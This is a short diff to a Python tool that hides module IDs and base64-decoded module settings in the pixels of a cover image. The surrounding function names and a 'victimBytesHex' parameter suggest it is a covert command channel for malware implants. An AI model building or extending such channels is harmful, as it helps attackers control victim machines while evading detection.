@@ -368,10 +368,26 @@ def UpdateModule(moduleName : str, DLLPath : str, description : str, username : 
 def FormStego(modules : list[str], coverPath : str, outPath : str, victimBytesHex : str):
     cover = Image.open(coverPath).convert("RGB")
     modulesBinaryForm = []
+    
+    #We have to add the argument info for each module
+    with open(os.path.join(os.getcwd(), "ModuleSettings.JSON"), "r") as f:
+        moduleSettingsDict = json.load(f)
+    
     for module in modules:
         moduleBytes = int(module).to_bytes(NO_BYTES_PER_MODULE, byteorder="big", signed=False)
         moduleBytesStrForm = "".join(f'{bit:08b}' for bit in moduleBytes)
         for bitStr in moduleBytesStrForm:
+            modulesBinaryForm.append(bitStr)
+        
+        #Adding the module info
+        moduleSetting = base64.b64decode(moduleSettingsDict[module])
+        lengthDifference = 62 - len(moduleSetting)
+        if(lengthDifference > 0):
+            moduleSetting += os.urandom(lengthDifference)
+        
+        moduleSettingStrForm = "".join(f'{bit:08b}' for bit in moduleSetting)
+        
+        for bitStr in moduleSettingStrForm:
             modulesBinaryForm.append(bitStr)
     
     #Adding the transmission end marker
